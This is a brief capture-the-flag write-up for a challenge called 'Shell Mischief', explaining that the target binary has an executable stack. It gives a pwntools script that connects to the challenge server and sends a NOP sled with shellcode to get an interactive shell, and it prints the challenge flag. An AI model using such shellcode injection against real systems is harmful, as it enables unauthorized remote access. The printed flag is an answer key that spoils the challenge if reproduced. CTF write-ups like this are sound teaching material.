# Shell Mischief

## Analysis
The stack of the binary was executable so we can place shellcode and execute it.

## Solution
```python
from pwn import *

#p = process("./vuln")
p = remote("34.125.199.248", 1234)

payload = b"\x90" * 128
payload += asm(shellcraft.sh())
p.sendline(payload)

p.clean()

p.interactive()
```

## Flag
```
OSCTF{u_r_b3rry_mischievous_xD}
```
